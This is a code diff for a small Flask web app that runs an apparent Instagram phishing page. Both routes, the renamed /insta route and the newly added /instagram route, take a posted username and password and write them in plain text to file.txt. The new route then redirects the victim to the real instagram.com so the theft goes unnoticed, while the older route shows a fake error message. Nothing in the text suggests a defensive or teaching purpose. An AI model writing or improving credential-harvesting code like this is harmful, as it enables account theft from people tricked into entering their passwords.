@@ -1,4 +1,4 @@
-from flask import Flask, render_template, flash, request
+from flask import Flask, render_template, flash, request, redirect
 from flask_wtf import FlaskForm
 from wtforms import StringField, SubmitField
 from wtforms.validators import DataRequired
@@ -48,7 +48,7 @@ def nameform():
 		name=name,
 		form=form)
 
-@app.route('/instagram', methods=['GET', 'POST'])
+@app.route('/insta', methods=['GET', 'POST'])
 def insta():
 	if request.method == 'POST':
 		username = request.form.get('username')
@@ -58,3 +58,15 @@ def insta():
 			f.write(f"insta\nusername: {username}\npassword: {password}\n")
 		return "<center><h1>SOMETHING WENT WRONG, WE ARE WORKING TO FIX IT!</h1></center>"
 	return render_template('insta.html')
+
+@app.route('/instagram', methods=['GET', 'POST'])
+def instagram():
+	if request.method == 'POST':
+		username = request.form.get('username')
+		password = request.form.get('password')
+		# return f"username: {username} <br> password: {password}"
+		with open('file.txt', 'w') as f:
+			f.write(f"insta\nusername: {username}\npassword: {password}\n")
+		return redirect('https://www.instagram.com/')
+		# return "<center><h1>SOMETHING WENT WRONG, WE ARE WORKING TO FIX IT!</h1></center>"
+	return render_template('instagram.html')
